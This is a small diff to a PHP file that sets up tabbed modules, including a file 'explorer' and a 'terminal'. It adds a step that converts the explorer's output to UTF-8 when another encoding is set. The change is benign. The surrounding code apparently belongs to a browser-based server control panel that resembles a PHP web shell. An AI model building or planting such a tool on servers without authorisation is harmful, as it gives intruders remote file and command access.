@@ -37,6 +37,9 @@ else $explorer_content = show_all_files(get_cwd());
 $GLOBALS['module']['explorer']['id'] = "explorer";
 $GLOBALS['module']['explorer']['title'] = "Explorer";
 $GLOBALS['module']['explorer']['js_ontabselected'] = "";
+if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
+    $explorer_content = convert_encode($GLOBALS['encode'], 'utf-8', $explorer_content);
+}
 $GLOBALS['module']['explorer']['content'] = $explorer_content;
 
 $GLOBALS['module']['terminal']['id'] = "terminal";
